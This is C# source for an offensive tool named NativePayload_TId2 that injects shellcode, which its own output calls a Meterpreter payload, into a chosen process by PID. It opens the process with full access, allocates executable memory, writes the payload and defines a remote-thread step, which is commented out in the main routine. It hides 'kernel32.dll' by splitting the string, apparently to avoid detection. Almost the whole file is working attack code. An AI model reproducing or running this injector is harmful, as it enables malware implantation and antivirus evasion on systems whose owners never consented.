using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_TId2
{
    class Program
    {
        public class DelCLSInvoke
        {
            [Flags]
            public enum ProcessAccessFlags : uint
            {
                Terminate = 0x00000001,
                CreateThread = 0x00000002,
                VMOperation = 0x00000008,
                VMRead = 0x00000010,
                VMWrite = 0x00000020,
                DupHandle = 0x00000040,
                SetInformation = 0x00000200,
                QueryInformation = 0x00000400,
                Synchronize = 0x00100000,
                All = 0x001F0FFF
            }

            [Flags]
            public enum AllocationType
            {
                Commit = 0x00001000,
                Reserve = 0x00002000,
                Decommit = 0x00004000,
                Release = 0x00008000,
                Reset = 0x00080000,
                TopDown = 0x00100000,
                WriteWatch = 0x00200000,
                Physical = 0x00400000,
                LargePages = 0x20000000
            }

            [Flags]
            public enum MemoryProtection
            {
                NoAccess = 0x0001,
                ReadOnly = 0x0002,
                ReadWrite = 0x0004,
                WriteCopy = 0x0008,
                Execute = 0x0010,
                ExecuteRead = 0x0020,
                ExecuteReadWrite = 0x0040,
                ExecuteWriteCopy = 0x0080,
                GuardModifierflag = 0x0100,
                NoCacheModifierflag = 0x0200,
                WriteCombineModifierflag = 0x0400
            }
            [DllImport("ke" + "rne" + "l" + "32.dll")]
            public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

            [DllImport("kernel32.dll")]
            public static extern bool CloseHandle(IntPtr hObject);

            [DllImport("ke" + "rne" + "l" + "32.dll")]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

            [DllImport("ke" + "rne" + "l" + "32.d" + "ll")]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

            [DllImport("k" + "e" + "r" + "ne" + "l" + "32.dll")]
            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
            public static string mytest()
            {
                Console.Write("bingo bingo");
                return "dsds";
            }

            public static IntPtr _Step1_(int XprocID, string Xcode)
            {
                string[] X = Xcode.Split(',');
                int Injection_to_PID = XprocID;
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("[!] Injection Started, Time {0}", DateTime.Now.ToString());
                Console.WriteLine("[!] Payload Length {0}", X.Length.ToString());
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.Write("[>] Injecting Meterpreter Payload to ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}:{1} ", Process.GetProcessById(Injection_to_PID).ProcessName, Process.GetProcessById(Injection_to_PID).Id.ToString());
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.Write("Process");
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine();
                Console.WriteLine("[!] Thread/Payload Writing Done, Time {0}", DateTime.Now.ToString());
                Console.WriteLine();


                byte[] Xpayload = new byte[X.Length];

                for (int i = 0; i < X.Length;)
                {
                    Xpayload[i] = Convert.ToByte(X[i], 16);
                    i++;
                }
                //  Console.WriteLine("[" + System.DateTime.Now.ToString() + "] Delay Detected.");

                IntPtr x = OpenProcess(ProcessAccessFlags.All, false, Injection_to_PID);
                return x;
            }
            public static IntPtr _Step2_(IntPtr a, int p)
            {
                IntPtr x = VirtualAllocEx(a, IntPtr.Zero, (uint)p, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
                return x;
            }
            public static bool _Step3_(IntPtr H, IntPtr P, byte[] pay)
            {
                UIntPtr BS = UIntPtr.Zero;
                if (WriteProcessMemory(H, P, pay, (uint)pay.Length, out BS))
                {
                    // Console.Write("Bingo ;D");
                    return true;
                }
                else
                {
                    return false;
                }
            }
            public static IntPtr _Step4_(IntPtr H, IntPtr HA)
            {
                uint x = 0;
                IntPtr cde = CreateRemoteThread(H, IntPtr.Zero, 0, HA, IntPtr.Zero, 0, out x);
                /// close
                CloseHandle(cde);
                CloseHandle(HA);
                return cde;
            }
        }
        public delegate IntPtr Mydels1and2(int a, string b);
        public delegate IntPtr Mydels2and3(IntPtr a, int p);
        public delegate bool Mydels3and4(IntPtr H, IntPtr P, byte[] pay);
        public delegate IntPtr Mydels4and4(IntPtr H, IntPtr HA);
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_TId2 , Published by Damon Mohammadbagher , May 2020");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_TId2 Thread Injection into Target Process + C# Delegate [Step1]");
            Console.WriteLine();
            bool delay = false;
            string[] X = null;
            byte[] Xpayload = null;
            if (Convert.ToInt32( args[0]) > 0)
            {
                delay = true;
                 X = args[2].Split(',');
                int Injection_to_PID = (Convert.ToInt32(args[1]));

                Xpayload = new byte[X.Length];

                for (int i = 0; i < X.Length;)
                {
                    Xpayload[i] = Convert.ToByte(X[i], 16);
                    i++;
                }
            }
            else if (args[0].ToUpper() == "0")
            {
                delay = false;
                X = args[2].Split(',');
                int Injection_to_PID = (Convert.ToInt32(args[1]));

                Xpayload = new byte[X.Length];

                for (int i = 0; i < X.Length;)
                {
                    Xpayload[i] = Convert.ToByte(X[i], 16);
                    i++;
                }
            }
           

            Mydels1and2 delstep1 = new Mydels1and2(DelCLSInvoke._Step1_);
            Mydels2and3 delstep2 = new Mydels2and3(DelCLSInvoke._Step2_);
            Mydels3and4 delstep3 = new Mydels3and4(DelCLSInvoke._Step3_);
            // Mydels4and4 delstep4 = new Mydels4and4(DelCLSInvoke._Step4_);
            if (delay)
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("[!] Steps will run by Delay.({0}).", args[0]);
            }
            if (delay) System.Threading.Thread.Sleep(Convert.ToInt32(args[0]));
            IntPtr H = delstep1.Invoke(Convert.ToInt32(args[1]), args[2]);
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("Step1 Delegate.Invoke(");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}", H.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write(") Intptr Done.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" [API::OpenProcess]");
            Console.WriteLine();

            if (delay) System.Threading.Thread.Sleep(Convert.ToInt32(args[0]));
            IntPtr HA = delstep2.Invoke(H, Xpayload.Length);
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("Step2 Delegate.Invoke(");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}", HA.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write(") Intptr Done.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" [API::VirtualAllocEx]");
            Console.WriteLine();

            if (delay) System.Threading.Thread.Sleep(Convert.ToInt32(args[0]));

            if (delstep3.Invoke(H, HA, Xpayload))
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("Step3 Delegate.Invoke(");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}0000000", 0.ToString());
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write(") true ;D Done.");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(" [API::WriteProcessMemory]");
                Console.WriteLine();

            }
        }
    }
}
